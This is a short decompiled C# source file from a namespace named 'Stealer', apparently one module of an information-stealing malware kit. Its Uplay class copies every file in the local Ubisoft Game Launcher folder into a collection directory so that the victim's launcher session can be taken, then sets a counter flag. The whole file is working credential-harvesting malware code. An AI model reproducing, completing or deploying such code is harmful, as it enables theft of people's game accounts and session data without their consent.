﻿using System;
using System.IO;

namespace Stealer
{
	// Token: 0x0200001B RID: 27
	internal sealed class Uplay
	{
		// Token: 0x06000084 RID: 132 RVA: 0x00004B44 File Offset: 0x00002D44
		public static bool GetUplaySession(string sSavePath)
		{
			if (!Directory.Exists(Uplay.path))
			{
				return false;
			}
			Directory.CreateDirectory(sSavePath);
			foreach (string sourceFileName in Directory.GetFiles(Uplay.path))
			{
				File.Copy(sourceFileName, Path.Combine(sSavePath, Path.GetFileName(sourceFileName)));
			}
			Counter.Uplay = true;
			return true;
		}

		// Token: 0x0400006C RID: 108
		private static string path = Path.Combine(Paths.lappdata, "Ubisoft Game Launcher");
	}
}
